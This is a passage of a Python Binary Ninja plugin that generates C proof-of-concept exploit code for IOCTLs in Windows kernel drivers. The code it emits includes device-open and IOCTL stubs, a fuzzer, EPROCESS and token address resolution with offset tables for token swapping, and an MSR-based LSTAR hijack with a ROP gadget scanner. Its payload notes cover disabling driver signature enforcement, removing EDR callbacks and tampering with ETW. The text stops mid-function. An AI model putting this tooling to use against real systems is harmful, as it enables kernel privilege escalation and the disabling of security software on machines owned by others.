"""
Binary Ninja plugin - POC scaffolding generator.

Emits a compilable C user-mode POC and a Python ctypes harness for the
analyzed driver. Each discovered IOCTL gets a stub with:
  - Buffer size from InputBufferLength / OutputBufferLength heuristic
  - METHOD-aware buffer handling (BUFFERED vs NEITHER vs DIRECT)
  - Primitive-aware payload comments (write-what-where, arb read, etc.)
  - Fuzz loop with size variation
"""

import os
import re
from binaryninja import BinaryView, log_info, log_warn
from binaryninja.plugin import PluginCommand

from ..shared.dispatch import find_dispatch_routines
from ..shared.eprocess_offsets import EPROCESS_OFFSETS, DEFAULT_OFFSETS
from ..shared.ioctl_shared import (
    ioctl_branches_for_dispatcher, ctl_decode, METHOD_MAP,
)
from ..shared.primitive_db import (
    NAME_TAG_MAP, HLIL_INTRINSIC_TAGS, deep_text,
)
from .win_primitives import (
    _detect_write_what_where, _detect_arb_read, _detect_stack_bof,
    _detect_pool_bof, _detect_token_swap_enabler, _detect_double_fetch,
    _detect_ioring, _detect_null_deref, _detect_name_hints,
    _detect_virtual_mem_rw, _detect_mdl_map, _detect_handle_dup,
    _detect_callback_removal, _detect_process_thread_manip,
    _detect_dse_bypass, _detect_etw_tamper, _detect_section_phys,
)


# NAME_TAG_MAP and HLIL_INTRINSIC_TAGS imported from shared.primitive_db

# ---------------------------------------------------------------------------
# C offset-table generators - single source of truth from shared.eprocess_offsets
# ---------------------------------------------------------------------------
# Privilege offset in _TOKEN->Privileges is constant across all known builds
_TOKEN_PRIV_OFFSET = 0x40


def _deduplicated_offsets():
    """Return EPROCESS_OFFSETS with duplicate builds removed (first wins)."""
    seen = set()
    out = []
    for o in EPROCESS_OFFSETS:
        if o.build not in seen:
            seen.add(o.build)
            out.append(o)
    return out


def _gen_c_off_table_basic():
    """Generate C lines for the compact OFF_TBL g_off[] (build,pid,links,token).

    Used by the generic POC elevation helpers.
    """
    lines = []
    lines.append("typedef struct { DWORD build; ULONG pid; ULONG links; ULONG token; } OFF_TBL;")
    lines.append("static const OFF_TBL g_off[] = {")
    for o in _deduplicated_offsets():
        lines.append(
            f"    {{{o.build},0x{o.pid:x},0x{o.links:x},0x{o.token:x}}},  /* {o.name} */"
        )
    d = DEFAULT_OFFSETS
    lines.append(f"    {{0,    0x{d.pid:x},0x{d.links:x},0x{d.token:x}}},  /* fallback */")
    lines.append("};")
    return lines


def _gen_c_off_table_v1():
    """Generate C lines for OFFSETS g_off_table[] (build,pid,links,token,priv).

    Used by the EPROCESS finder emitter (v1).
    """
    lines = []
    lines.append("typedef struct { DWORD build; ULONG pid; ULONG links; ULONG token; ULONG priv; } OFFSETS;")
    lines.append("static const OFFSETS g_off_table[] = {")
    lines.append("    /* build  PID    Links  Token  Priv */")
    for o in _deduplicated_offsets():
        lines.append(
            f"    {{ {o.build:>5}, 0x{o.pid:03x}, 0x{o.links:03x}, "
            f"0x{o.token:03x}, 0x{_TOKEN_PRIV_OFFSET:02x} }}, /* {o.name} */"
        )
    d = DEFAULT_OFFSETS
    lines.append(
        f"    {{     0, 0x{d.pid:03x}, 0x{d.links:03x}, "
        f"0x{d.token:03x}, 0x{_TOKEN_PRIV_OFFSET:02x} }}, /* fallback   */"
    )
    lines.append("};")
    return lines


def _gen_c_off_table_v2():
    """Generate C lines for OFFSETS g_off_table[] with protection field.

    Used by the v2 EPROCESS finder emitter.
    """
    lines = []
    lines.append("typedef struct { DWORD build; ULONG pid; ULONG links; ULONG token; ULONG priv; ULONG protection; } OFFSETS;")
    lines.append("static const OFFSETS g_off_table[] = {")
    lines.append("    /* build   PID    Links  Token  Priv  Protection */")
    for o in _deduplicated_offsets():
        prot = o.protection if o.protection else DEFAULT_OFFSETS.protection
        lines.append(
            f"    {{ {o.build:>5}, 0x{o.pid:03x}, 0x{o.links:03x}, "
            f"0x{o.token:03x}, 0x{_TOKEN_PRIV_OFFSET:02x}, 0x{prot:03x} }}, /* {o.name} */"
        )
    d = DEFAULT_OFFSETS
    lines.append(
        f"    {{     0, 0x{d.pid:03x}, 0x{d.links:03x}, "
        f"0x{d.token:03x}, 0x{_TOKEN_PRIV_OFFSET:02x}, 0x{d.protection:03x} }}, /* fallback   */"
    )
    lines.append("};")
    return lines


def _classify(text, bv=None, instrs=None):
    tags = []
    if _detect_write_what_where(text):   tags.append('write_what_where')
    if _detect_arb_read(text):           tags.append('arb_read')
    if _detect_stack_bof(text):          tags.append('stack_bof')
    if _detect_pool_bof(text):           tags.append('pool_bof')
    if _detect_token_swap_enabler(text): tags.append('token_swap')
    if _detect_double_fetch(text):       tags.append('double_fetch')
    if _detect_null_deref(text):         tags.append('null_deref')
    if _detect_ioring(text):             tags.append('ioring')
    if _detect_virtual_mem_rw(text):     tags.append('vmem_rw')
    if _detect_mdl_map(text):            tags.append('mdl_rw')
    if _detect_handle_dup(text):         tags.append('handle_dup')
    if _detect_section_phys(text):       tags.append('section_access')
    if _detect_callback_removal(text):   tags.append('callback_removal')
    if _detect_process_thread_manip(text): tags.append('process_kill')
    if _detect_dse_bypass(text):         tags.append('dse_bypass')
    if _detect_etw_tamper(text):         tags.append('etw_tamper')
    # Direct HLIL intrinsic/API detection
    for needle, tag in HLIL_INTRINSIC_TAGS.items():
        if needle in text and tag not in tags:
            tags.append(tag)
    if bv is not None and instrs is not None:
        for _sev, label in _detect_name_hints(bv, instrs):
            ll = label.lower()
            for needle, tag in NAME_TAG_MAP.items():
                if needle in ll and tag not in tags:
                    tags.append(tag)
    return tags


def _detect_device(bv):
    for s in bv.strings:
        try:
            v = s.value
            lv = v.lower()
            if lv.startswith('\\device\\') or lv.startswith('\\dosdevices\\'):
                return v
        except Exception:
            pass
    return None


def _user_device_path(dev):
    if not dev:
        return r"\\\\.\\REPLACE_ME"
    last = dev.rstrip('\\').split('\\')[-1]
    return r"\\\\.\\" + last


_PAYLOAD_NOTES = {
    'write_what_where': "Write-What-Where: layout often [u64 target_addr][u64 value]. Resize and shuffle.",
    'arb_read':         "Arbitrary read: layout often [u64 src_addr] in / [bytes] out. Use OutputBufferLength.",
    'stack_bof':        "Stack BoF: oversize input buffer to overflow kernel stack frame. Watch /GS cookie.",
    'pool_bof':         "Pool BoF: oversize copy vs allocation; consider LFH bucket spray.",
    'token_swap':       "Token swap enabler: provide current PID; driver may patch Token offset.",
    'double_fetch':     "Double-fetch TOCTOU: race a second thread mutating the user buffer.",
    'null_deref':       "NULL deref: trigger alloc failure path (low-mem / huge size) to crash.",
    'ioring':           "IORING primitive: see knifecoat.com / windows-internals.com for full arb R/W chain.",
    'arb_rw':           "Generic arb R/W primitive. Probe layout: [u64 addr][u64 val] or [u64 addr][u32 len][bytes].",
    'arb_increment':    "Arbitrary increment: layout = [u64 target_addr]. Use to flip _SEP_TOKEN_PRIVILEGES bits.",
    'process_read':     "Process memory read: layout often [u32 pid][u64 va][u32 len]. Returns bytes in out_buf.",
    'process_write':    "Process memory write: layout often [u32 pid][u64 va][u32 len][bytes].",
    'msr_rw':           "MSR R/W: layout often [u32 msr_index] for read or [u32 msr_index][u64 value] for write. Patch LSTAR/STAR/SYSENTER_EIP.",
    'port_io':          "Port IO: layout often [u16 port][u8 size]. Used for PCI/SMRAM/embedded controllers.",
    'phys_mem':         "Physical memory access: layout often [u64 phys_addr][u32 len]. Walk PFN -> kernel VA -> read/write.",
    'pci_config':       "PCI config space: layout often [u8 bus][u8 dev][u8 func][u16 offset][u8 size].",
    'cr_access':        "Control/Debug register access. Disabling CR0.WP enables write to read-only kernel pages (SMEP bypass legacy).",
    'ring0_exec':       "Capcom-style ring-0 exec: pass user function pointer; driver calls it in kernel context. Direct LPE.",
    'process_kill':     "Process kill primitive: pass target PID. EDR/AV bypass class.",
    'process_protect':  "Process protection toggle: flip EPROCESS.SignatureLevel / PsProtection.",
    'callback_removal': "Callback array removal: walk PsSetCreateProcessNotifyRoutine / Cm / Ob callback arrays and zero entries.",
    'etw_tamper':       "ETW tampering: patch EtwThreatIntProvRegHandle or EtwpEventEnabled tables.",
    'ssdt_tamper':      "SSDT hook/unhook: read/write ntoskrnl!KiServiceTable entries.",
    'driver_load':      "Driver load primitive: ZwLoadDriver / IoCreateDriver / MmLoadSystemImage style.",
    'section_access':   "Section open/map: ZwOpenSection + ZwMapViewOfSection of \\KernelObjects\\... or \\Device\\PhysicalMemory.",
    'insecure_file':    "Kernel file/registry access in driver context (no impersonation) - SYSTEM-level R/W on user-supplied path.",
    'vmem_rw':          "Virtual memory R/W: layout often [u32 pid][u64 addr][u32 len][bytes]. Direct EPROCESS token overwrite.",
    'mdl_rw':           "MDL kernel-to-user map: layout often [u64 kernel_va][u32 len]. Returns user-mapped pointer to kernel memory.",
    'handle_dup':       "Handle duplication: layout often [u32 src_pid][u32 handle][u32 access]. Dup SYSTEM process handle for full access.",
    'dse_bypass':       "DSE/CI bypass: patch ci!g_CiOptions (0x6 -> 0x0) to disable driver signature enforcement.",
}


def _payload_comment_c(tags):
    if not tags:
        return "    // No primitive detected. Use as plain test harness.\n"
    out = "    // Detected primitives: " + ", ".join(tags) + "\n"
    for t in tags:
        out += "    // - " + (_PAYLOAD_NOTES.get(t) or t) + "\n"
    return out


# ---------------------------------------------------------------------------
# C emitter
# ---------------------------------------------------------------------------

def _emit_c(driver_name, device_path, entries):
    """entries: list of (idx, code, method_name, tags, default_in, default_out)."""
    out = []
    out.append('/*')
    out.append(' * Auto-generated POC scaffolding for: ' + driver_name)
    out.append(' * IOCTLs discovered: ' + str(len(entries)))
    out.append(' * Build (MSVC): ml64 /c /Fo trampoline.obj ' + driver_name + '-trampoline.asm')
    out.append(' *               cl /W3 /Zi ' + driver_name + '-poc.c trampoline.obj')
    out.append(' * USE ON AUTHORIZED TARGETS ONLY.')
    out.append(' */')
    # Determine if elevation primitives exist (need extra headers)
    _ELEV_TAGS = {'msr_rw','phys_mem','write_what_where','arb_read',
                  'token_swap','ring0_exec','arb_increment',
                  'vmem_rw','mdl_rw','handle_dup'}
    any_elev_tag = any(
        _ELEV_TAGS & set(tags)
        for _i, _c, _m, tags, _is, _os in entries
    )
    out.append('#include <windows.h>')
    if any_elev_tag:
        out.append('#include <winternl.h>')
        out.append('#include <psapi.h>')
    out.append('#include <stdio.h>')
    out.append('#include <stdint.h>')
    out.append('#include <stdlib.h>')
    out.append('#include <string.h>')
    if any('msr_rw' in set(tags) for _i, _c, _m, tags, _is, _os in entries):
        out.append('#include <intrin.h>')
    if any_elev_tag:
        out.append('#pragma comment(lib, "advapi32.lib")')
        out.append('#pragma comment(lib, "psapi.lib")')
    out.append('')
    out.append('#define DEVICE_PATH  "' + device_path + '"')
    out.append('')
    out.append('static HANDLE g_dev = INVALID_HANDLE_VALUE;')
    out.append('')
    out.append('static int open_device(void) {')
    out.append('    g_dev = CreateFileA(DEVICE_PATH,')
    out.append('                        GENERIC_READ | GENERIC_WRITE,')
    out.append('                        FILE_SHARE_READ | FILE_SHARE_WRITE,')
    out.append('                        NULL, OPEN_EXISTING, 0, NULL);')
    out.append('    if (g_dev == INVALID_HANDLE_VALUE) {')
    out.append('        fprintf(stderr, "[!] CreateFile %s failed: %lu\\n", DEVICE_PATH, GetLastError());')
    out.append('        return 0;')
    out.append('    }')
    out.append('    printf("[+] Opened %s -> %p\\n", DEVICE_PATH, g_dev);')
    out.append('    return 1;')
    out.append('}')
    out.append('')
    out.append('static int send_ioctl(DWORD code, void *in_buf, DWORD in_len,')
    out.append('                      void *out_buf, DWORD out_len, DWORD *bytes_ret) {')
    out.append('    DWORD br = 0;')
    out.append('    BOOL ok = DeviceIoControl(g_dev, code, in_buf, in_len,')
    out.append('                              out_buf, out_len, &br, NULL);')
    out.append('    if (bytes_ret) *bytes_ret = br;')
    out.append('    if (!ok) {')
    out.append('        fprintf(stderr, "[!] IOCTL 0x%08X failed: %lu (br=%lu)\\n",')
    out.append('                code, GetLastError(), br);')
    out.append('        return 0;')
    out.append('    }')
    out.append('    return 1;')
    out.append('}')
    out.append('')

    out.append('typedef int (*trigger_fn)(void);')
    out.append('')
    # per-IOCTL stubs
    for idx, code, method, tags, in_sz, out_sz in entries:
        out.append('// --- IOCTL[' + str(idx) + '] 0x' + ('%08X' % code) + ' method=' + method + ' ---')
        out.append('static int trigger_' + str(idx) + '(void) {')
        out.append('    DWORD code = 0x' + ('%08X' % code) + ';')
        out.append('    BYTE  in_buf[0x' + ('%X' % in_sz) + '] = {0};')
        out.append('    BYTE  out_buf[0x' + ('%X' % out_sz) + '] = {0};')
        out.append('    DWORD br = 0;')
        out.append(_payload_comment_c(tags).rstrip('\n'))
        out.append('    return send_ioctl(code, in_buf, sizeof(in_buf), out_buf, sizeof(out_buf), &br);')
        out.append('}')
        out.append('')

    out.append('static trigger_fn g_triggers[] = {')
    for idx, code, method, tags, in_sz, out_sz in entries:
        out.append('    trigger_' + str(idx) + ',')
    out.append('};')
    out.append('')

    # fuzzer
    out.append('static int fuzz_all(unsigned iters) {')
    out.append('    DWORD codes[] = {')
    for _i, code, _m, _t, _is, _os in entries:
        out.append('        0x' + ('%08X' % code) + ',')
    out.append('    };')
    out.append('    BYTE  buf[0x2000];')
    out.append('    BYTE  out_buf[0x2000];')
    out.append('    DWORD br = 0;')
    out.append('    for (unsigned i = 0; i < iters; i++) {')
    out.append('        for (size_t k = 0; k < sizeof(codes)/sizeof(codes[0]); k++) {')
    out.append('            for (size_t j = 0; j < sizeof(buf); j++) buf[j] = (BYTE)rand();')
    out.append('            DWORD in_len  = (rand() % sizeof(buf)) + 1;')
    out.append('            DWORD out_len = (rand() % sizeof(out_buf)) + 1;')
    out.append('            DeviceIoControl(g_dev, codes[k], buf, in_len, out_buf, out_len, &br, NULL);')
    out.append('        }')
    out.append('    }')
    out.append('    return 1;')
    out.append('}')
    out.append('')

    out.append('static int probe_all(void) {')
    out.append('    DWORD codes[] = {')
    for _i, code, _m, _t, _is, _os in entries:
        out.append('        0x' + ('%08X' % code) + ',')
    out.append('    };')
    out.append('    BYTE  in_buf[0x400] = {0};')
    out.append('    BYTE  out_buf[0x400] = {0};')
    out.append('    DWORD br = 0; int hits = 0;')
    out.append('    int n = sizeof(codes)/sizeof(codes[0]);')
    out.append('    printf("[>] Probing %d IOCTLs with zero buffer...\\n", n);')
    out.append('    for (int i = 0; i < n; i++) {')
    out.append('        BOOL ok = DeviceIoControl(g_dev, codes[i], in_buf, sizeof(in_buf),')
    out.append('                                  out_buf, sizeof(out_buf), &br, NULL);')
    out.append('        DWORD err = ok ? 0 : GetLastError();')
    out.append('        printf("  [%3d] 0x%08X %s br=%-5lu winerr=%lu\\n",')
    out.append('               i, codes[i], ok ? "OK " : "ERR", br, err);')
    out.append('        if (ok) hits++;')
    out.append('    }')
    out.append('    printf("[+] Probe done. %d/%d returned success.\\n", hits, n);')
    out.append('    return 1;')
    out.append('}')
    out.append('')
    # Categorize IOCTLs by primitive for exploit_elevate
    tag_ioctl_map = {}
    for _idx, code, _m, tags, _is, _os in entries:
        for t in tags:
            tag_ioctl_map.setdefault(t, []).append(code)

    has_msr = 'msr_rw' in tag_ioctl_map
    has_phys = 'phys_mem' in tag_ioctl_map
    has_www = 'write_what_where' in tag_ioctl_map
    has_arb_read = 'arb_read' in tag_ioctl_map
    has_token_swap = 'token_swap' in tag_ioctl_map
    has_ring0 = 'ring0_exec' in tag_ioctl_map
    has_arb_inc = 'arb_increment' in tag_ioctl_map
    has_vmem_rw = 'vmem_rw' in tag_ioctl_map
    has_mdl_rw = 'mdl_rw' in tag_ioctl_map
    has_handle_dup = 'handle_dup' in tag_ioctl_map
    has_any_elev = (has_msr or has_phys or has_www or has_arb_read or has_token_swap
                    or has_ring0 or has_arb_inc or has_vmem_rw or has_mdl_rw or has_handle_dup)

    # EPROCESS finder helpers (needed by most elevation paths)
    if has_any_elev:
        out.append('typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);')
        out.append('static pfnNtQSI g_NtQSI;')
        out.append('')
        out.append('#define SYS_MODULE_INFO    11')
        out.append('#define SYS_HANDLE_INFO_EX 64')
        out.append('#define SYS_CI_INFO        103')
        out.append('#define STATUS_INFO_LEN_MISMATCH ((NTSTATUS)0xC0000004L)')
        out.append('')
        out.append('typedef struct _RTL_MOD { HANDLE S; PVOID MB; PVOID IB; ULONG IS; ULONG F;')
        out.append('    USHORT LO; USHORT IO; USHORT LC; USHORT OFN; UCHAR FPN[256]; } RTL_MOD;')
        out.append('typedef struct _RTL_MODS { ULONG Count; RTL_MOD Modules[1]; } RTL_MODS;')
        out.append('typedef struct _SHE { PVOID Obj; ULONG_PTR Pid; ULONG_PTR Hval;')
        out.append('    ULONG GA; USHORT CBI; USHORT OTI; ULONG HA; ULONG Rsv; } SHE;')
        out.append('typedef struct _SHIE { ULONG_PTR N; ULONG_PTR R; SHE H[1]; } SHIE;')
        out.append('')
        for line in _gen_c_off_table_basic():
            out.append(line)
        out.append('')
        out.append('static const OFF_TBL *get_offsets(void) {')
        out.append('    char buf[16]={0}; DWORD sz=sizeof(buf),bld=0; HKEY hk;')
        out.append('    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,')
        out.append('        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion",0,KEY_READ,&hk)==0){')
        out.append('        RegQueryValueExA(hk,"CurrentBuildNumber",NULL,NULL,(LPBYTE)buf,&sz);')
        out.append('        RegCloseKey(hk); bld=(DWORD)atoi(buf);')
        out.append('    }')
        out.append('    for(int i=0; g_off[i].build; i++)')
        out.append('        if(g_off[i].build==bld) return &g_off[i];')
        out.append('    return &g_off[sizeof(g_off)/sizeof(g_off[0])-1];')
        out.append('}')
        out.append('')
        out.append('static ULONG_PTR get_kbase(void) {')
        out.append('    LPVOID d[1024]; DWORD n=0;')
        out.append('    if(EnumDeviceDrivers(d,sizeof(d),&n)) return (ULONG_PTR)d[0];')
        out.append('    return 0;')
        out.append('}')
        out.append('')
        out.append('static SHIE *query_handles(void) {')
        out.append('    ULONG sz=0x100000;')
        out.append('    for(;;) {')
        out.append('        SHIE *b=(SHIE*)malloc(sz); ULONG o=0;')
        out.append('        if(!b) return NULL;')
        out.append('        NTSTATUS st=g_NtQSI(SYS_HANDLE_INFO_EX,b,sz,&o);')
        out.append('        if(st==0) return b;')
        out.append('        free(b);')
        out.append('        if(st!=STATUS_INFO_LEN_MISMATCH) return NULL;')
        out.append('        sz=o+0x1000;')
        out.append('    }')
        out.append('}')
        out.append('')
        out.append('static ULONG_PTR h2k(SHIE *hi, ULONG_PTR pid, HANDLE h) {')
        out.append('    ULONG_PTR hv=(ULONG_PTR)h;')
        out.append('    for(ULONG_PTR i=0;i<hi->N;i++)')
        out.append('        if(hi->H[i].Pid==pid && hi->H[i].Hval==hv) return (ULONG_PTR)hi->H[i].Obj;')
        out.append('    return 0;')
        out.append('}')
        out.append('')
        out.append('typedef struct { ULONG_PTR own_ep; ULONG_PTR sys_ep; ULONG_PTR own_tok; ULONG_PTR kbase; } KINFO;')
        out.append('')
        out.append('static int resolve_kernel_info(KINFO *ki) {')
        out.append('    g_NtQSI=(pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");')
        out.append('    if(!g_NtQSI){printf("    [!] NtQSI resolve failed\\n");return 0;}')
        out.append('    ULONG_PTR pid=(ULONG_PTR)GetCurrentProcessId();')
        out.append('    HANDLE hSelf=OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,(DWORD)pid);')
        out.append('    HANDLE hTok=NULL; OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hTok);')
        out.append('    HANDLE hSys=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,4);')
        out.append('    SHIE *hi=query_handles();')
        out.append('    if(!hi){printf("    [!] Handle query failed\\n");return 0;}')
        out.append('    ki->own_ep=h2k(hi,pid,hSelf); if(hSelf)CloseHandle(hSelf);')
        out.append('    ki->own_tok=h2k(hi,pid,hTok); if(hTok)CloseHandle(hTok);')
        out.append('    ki->sys_ep=hSys?h2k(hi,pid,hSys):0; if(hSys)CloseHandle(hSys);')
        out.append('    ki->kbase=get_kbase();')
        out.append('    free(hi);')
        out.append('    printf("    [*] Own EPROCESS:  0x%llx\\n",(unsigned long long)ki->own_ep);')
        out.append('    printf("    [*] SYS EPROCESS:  0x%llx\\n",(unsigned long long)ki->sys_ep);')
        out.append('    printf("    [*] Own TOKEN KVA: 0x%llx\\n",(unsigned long long)ki->own_tok);')
        out.append('    printf("    [*] ntoskrnl base: 0x%llx\\n",(unsigned long long)ki->kbase);')
        out.append('    if(!ki->own_ep||!ki->sys_ep){printf("    [!] EPROCESS resolution failed\\n");return 0;}')
        out.append('    return 1;')
        out.append('}')
        out.append('')

    # Emit MSR read/write helpers + driver-agnostic LSTAR hijack (driverscloud pattern)
    if has_msr:
        msr_read_code = tag_ioctl_map['msr_rw'][0]
        msr_write_code = tag_ioctl_map['msr_rw'][1] if len(tag_ioctl_map['msr_rw']) > 1 else msr_read_code
        out.append('/* ================================================================')
        out.append(' * Driver-specific layer: MSR read/write via IOCTLs.')
        out.append(' * Everything above this is driver-agnostic.')
        out.append(' * ================================================================ */')
        out.append('#pragma pack(push,1)')
        out.append('typedef struct { uint32_t idx; uint64_t val; } MSR_WR_BUF;')
        out.append('#pragma pack(pop)')
        out.append('')
        out.append('static uint64_t ReadMSR(uint32_t index) {')
        out.append('    uint64_t out = 0; DWORD br = 0;')
        out.append('    send_ioctl(0x%08X, &index, sizeof(index), &out, sizeof(out), &br);' % msr_read_code)
        out.append('    return out;')
        out.append('}')
        out.append('')
        out.append('static int WriteMSR(uint32_t index, uint64_t value) {')
        out.append('    MSR_WR_BUF m = {index, value}; DWORD br = 0;')
        out.append('    return send_ioctl(0x%08X, &m, sizeof(m), NULL, 0, &br);' % msr_write_code)
        out.append('}')
        out.append('')
        out.append('/* ================================================================')
        out.append(' * Driver-agnostic layer: ntoskrnl info, gadget scanner,')
        out.append(' * write/read primitives via LSTAR hijack + iretq return.')
        out.append(' * Link with: syscall_trampoline.asm (MASM x64)')
        out.append(' * ================================================================ */')
        out.append('')
        out.append('#define IA32_LSTAR  0xC0000082')
        out.append('#define IA32_FMASK  0xC0000084')
        out.append('')
        out.append('extern void DoKernelWrite8(uint64_t targetVA, uint64_t value, void *ctx);')
        out.append('extern void DoKernelRead8(uint64_t targetVA, uint64_t *outBuf, void *ctx);')
        out.append('')
        out.append('typedef struct {')
        out.append('    HMODULE hNtk;')
        out.append('    uint64_t kbase;')
        out.append('    unsigned char *text;')
        out.append('    size_t text_sz;')
        out.append('    uint32_t text_rva;')
        out.append('} NtInfo;')
        out.append('')
        out.append('typedef struct {')
        out.append('    uint64_t pop_rcx_ret;')
        out.append('    uint64_t pop_rax_ret;')
        out.append('    uint64_t pop_rdx_ret;')
        out.append('    uint64_t wrmsr_ret;')
        out.append('    uint64_t mov_rdx_rax_ret;')
        out.append('    uint64_t iretq_addr;')
        out.append('    uint64_t origLSTAR;')
        out.append('    uint64_t origFMASK;')
        out.append('} RopCtx;')
        out.append('')
        out.append('typedef struct {')
        out.append('    uint64_t pop_rcx_ret;')
        out.append('    uint64_t pop_rax_ret;')
        out.append('    uint64_t pop_rdx_ret;')
        out.append('    uint64_t wrmsr_ret;')
        out.append('    uint64_t read_gadget;')
        out.append('    uint64_t write_gadget;')
        out.append('    uint64_t iretq_addr;')
        out.append('    uint64_t origLSTAR;')
        out.append('    uint64_t origFMASK;')
        out.append('    int readVariant;')
        out.append('} ReadRopCtx;')
        out.append('')
        out.append('static RopCtx     g_wctx;')
        out.append('static ReadRopCtx g_rctx;')
        out.append('static int g_write_ready, g_read_ready;')
        out.append('')
        out.append('static int LoadNtoskrnlFromDisk(NtInfo *ni) {')
        out.append('    char kpath[MAX_PATH];')
        out.append('    GetSystemDirectoryA(kpath, MAX_PATH);')
        out.append('    strcat_s(kpath, MAX_PATH, "\\\\ntoskrnl.exe");')
        out.append('    ni->hNtk = LoadLibraryExA(kpath, NULL, DONT_RESOLVE_DLL_REFERENCES);')
        out.append('    if(!ni->hNtk){printf("    [!] LoadLibrary ntoskrnl: %lu\\n",GetLastError());return 0;}')
        out.append('    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)ni->hNtk;')
        out.append('    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)((char*)ni->hNtk + dos->e_lfanew);')
        out.append('    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);')
        out.append('    for(int i=0;i<nt->FileHeader.NumberOfSections;i++){')
        out.append('        if(memcmp(sec[i].Name,".text",5)==0){')
        out.append('            ni->text=(unsigned char*)ni->hNtk+sec[i].VirtualAddress;')
        out.append('            ni->text_sz=sec[i].Misc.VirtualSize;')
        out.append('            ni->text_rva=sec[i].VirtualAddress; break;')
        out.append('        }')
        out.append('    }')
        out.append('    if(!ni->text){printf("    [!] .text not found\\n");FreeLibrary(ni->hNtk);return 0;}')
        out.append('    printf("    [*] ntoskrnl .text: RVA 0x%x size 0x%zx\\n",ni->text_rva,ni->text_sz);')
        out.append('    return 1;')
        out.append('}')
        out.append('')
        out.append('static uint64_t ScanForGadget(NtInfo *ni, const unsigned char *pat, size_t pat_len) {')
        out.append('    for(size_t j=0;j+pat_len<=ni->text_sz;j++){')
        out.append('        if(memcmp(ni->text+j,pat,pat_len)==0)')
        out.append('            return ni->kbase+ni->text_rva+j;')
        out.append('    }')
        out.append('    return 0;')
        out.append('}')
        out.append('')
        out.append('static uint64_t FindExportVA(NtInfo *ni, const char *name) {')
        out.append('    FARPROC p = GetProcAddress(ni->hNtk, name);')
        out.append('    if(!p) return 0;')
        out.append('    return ni->kbase + ((uint64_t)p - (uint64_t)ni->hNtk);')
        out.append('}')
        out.append('')
        out.append('static int InitWritePrimitive(NtInfo *ni) {')
        out.append('    static const unsigned char P_POP_RCX[] = {0x59,0xC3};')
        out.append('    static const unsigned char P_POP_RAX[] = {0x58,0xC3};')
        out.append('    static const unsigned char P_POP_RDX[] = {0x5A,0xC3};')
        out.append('    static const unsigned char P_WRMSR[]   = {0x0F,0x30,0xC3};')
        out.append('    static const unsigned char P_IRETQ[]   = {0x48,0xCF};')
        out.append('    static const unsigned char P_WR[]      = {0x48,0x89,0x02,0xC3};')
        out.append('    g_wctx.pop_rcx_ret    = ScanForGadget(ni, P_POP_RCX, sizeof(P_POP_RCX));')
        out.append('    g_wctx.pop_rax_ret    = ScanForGadget(ni, P_POP_RAX, sizeof(P_POP_RAX));')
        out.append('    g_wctx.pop_rdx_ret    = ScanForGadget(ni, P_POP_RDX, sizeof(P_POP_RDX));')
        out.append('    g_wctx.wrmsr_ret      = ScanForGadget(ni, P_WRMSR,   sizeof(P_WRMSR));')
        out.append('    g_wctx.iretq_addr     = ScanForGadget(ni, P_IRETQ,   sizeof(P_IRETQ));')
        out.append('    g_wctx.mov_rdx_rax_ret= ScanForGadget(ni, P_WR,      sizeof(P_WR));')
        out.append('    printf("    [+] pop rcx;ret     @ 0x%llx\\n",(unsigned long long)g_wctx.pop_rcx_ret);')
        out.append('    printf("    [+] pop rax;ret     @ 0x%llx\\n",(unsigned long long)g_wctx.pop_rax_ret);')
        out.append('    printf("    [+] pop rdx;ret     @ 0x%llx\\n",(unsigned long long)g_wctx.pop_rdx_ret);')
        out.append('    printf("    [+] wrmsr;ret       @ 0x%llx\\n",(unsigned long long)g_wctx.wrmsr_ret);')
        out.append('    printf("    [+] iretq           @ 0x%llx\\n",(unsigned long long)g_wctx.iretq_addr);')
        out.append('    printf("    [+] mov [rdx],rax   @ 0x%llx\\n",(unsigned long long)g_wctx.mov_rdx_rax_ret);')
        out.append('    g_write_ready = g_wctx.pop_rcx_ret && g_wctx.pop_rax_ret &&')
        out.append('        g_wctx.pop_rdx_ret && g_wctx.wrmsr_ret && g_wctx.iretq_addr && g_wctx.mov_rdx_rax_ret;')
        out.append('    if(!g_write_ready) printf("    [!] Write gadget set incomplete\\n");')
        out.append('    return g_write_ready;')
        out.append('}')
        out.append('')
        out.append('static int InitReadPrimitive(NtInfo *ni) {')
        out.append('    static const unsigned char P_RD0[]={0x48,0x8B,0x02,0xC3};')
        out.append('    static const unsigned char P_RD1[]={0x48,0x8B,0x03,0xC3};')
        out.append('    static const unsigned char P_RD2[]={0x48,0x8B,0x06,0xC3};')
        out.append('    static const unsigned char P_RD3[]={0x48,0x8B,0x07,0xC3};')
        out.append('    static const unsigned char P_RD4[]={0x48,0x8B,0x00,0xC3};')
        out.append('    static const unsigned char P_WR[] ={0x48,0x89,0x02,0xC3};')
        out.append('    struct { const unsigned char *pat; size_t len; const char *desc; } variants[] = {')
        out.append('        {P_RD0,4,"mov rax,[rdx];ret"},{P_RD1,4,"mov rax,[rbx];ret"},')
        out.append('        {P_RD2,4,"mov rax,[rsi];ret"},{P_RD3,4,"mov rax,[rdi];ret"},')
        out.append('        {P_RD4,4,"mov rax,[rax];ret"},')
        out.append('    };')
        out.append('    g_rctx.read_gadget = 0;')
        out.append('    g_rctx.readVariant = -1;')
        out.append('    for(int i=0;i<5;i++){')
        out.append('        uint64_t a = ScanForGadget(ni,variants[i].pat,variants[i].len);')
        out.append('        if(a){')
        out.append('            g_rctx.read_gadget=a; g_rctx.readVariant=i;')
        out.append('            printf("    [+] Read gadget: %s @ 0x%llx\\n",variants[i].desc,(unsigned long long)a);')
        out.append('            break;')
        out.append('        }')
        out.append('    }')
        out.append('    if(!g_rctx.read_gadget){printf("    [!] No read gadget found\\n");return 0;}')
        out.append('    g_rctx.write_gadget = ScanForGadget(ni,P_WR,sizeof(P_WR));')
        out.append('    if(!g_rctx.write_gadget){printf("    [!] Store-result gadget not found\\n");return 0;}')
        out.append('    g_rctx.pop_rcx_ret = g_wctx.pop_rcx_ret;')
